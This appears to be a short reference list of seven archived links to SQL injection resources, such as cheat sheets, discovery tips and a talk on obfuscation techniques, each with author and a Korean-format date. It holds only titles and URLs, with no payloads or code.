* [Manual SQL Injection Discovery Tips - Gerben Javado - 2017년 8월 26일](https://web.archive.org/web/20170826221724/https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
* [NetSPI SQL Injection Wiki - NetSPI - 2017년 12월 21일](https://web.archive.org/web/20171221044609/https://sqlwiki.netspi.com/)
* [PentestMonkey's mySQL injection cheat sheet - @pentestmonkey - 2011년 8월 15일](https://web.archive.org/web/20260109024910/https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
* [SQLi Cheatsheet - NetSparker - 2022년 3월 19일](https://web.archive.org/web/20220219223426/https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [SQLi in INSERT worse than SELECT - Mathias Karlsson - 2017년 2월 14일](https://web.archive.org/web/20231004093323/https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
* [SQLi Optimization and Obfuscation Techniques - Roberto Salgado - 2013년 7월 31일](https://web.archive.org/web/20221005232819/https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf)
* [The SQL Injection Knowledge base - Roberto Salgado - 2013년 5월 29일](https://web.archive.org/web/20260302110304/https://www.websec.ca/kb/sql_injection)
